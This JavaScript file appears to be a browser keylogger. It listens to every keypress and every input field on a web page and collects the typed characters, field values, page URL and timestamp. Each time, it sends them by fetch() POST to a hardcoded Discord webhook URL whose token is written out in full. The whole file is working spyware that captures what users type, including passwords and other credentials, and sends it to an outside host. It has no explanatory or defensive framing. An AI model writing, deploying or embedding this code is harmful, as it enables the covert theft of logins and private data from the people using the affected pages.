﻿let webhookUrl = "https://discord.com/api/webhooks/1170035936147538040/4FT2i3HSffr03LjRCFSYct4eXq55uOsUobh2hBJqMiWoE2OtgG1XClsGOqDYGPZenCzC";
let message = ``;

let dataKeypress = "KeyPress : ";
let dataInput = "";
let dataInputLength;
let website = "";
let time = "Date : " + Date();
const inputs = document.querySelectorAll("input");


inputs.forEach(input => {
    input.addEventListener("input", (e) => {
        dataInput = "Input : " + e.target.value;
        if (dataInputLength >= dataInput.length) {
            message = `Start prog :
            ${dataKeypress}
            ${dataInput}
            ${website}
            ${time}`;
            send();
        }
        dataInputLength = dataInput.length;
    });
});


window.addEventListener("keypress", (e) => {
    dataKeypress = dataKeypress + e.key;
    website = "Website : " + location.href;

    message = `Start prog :
    ${dataKeypress}
    ${dataInput}
    ${website}
    ${time}`;

    send();
});


const send = () => {
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ content: message }),
    });
};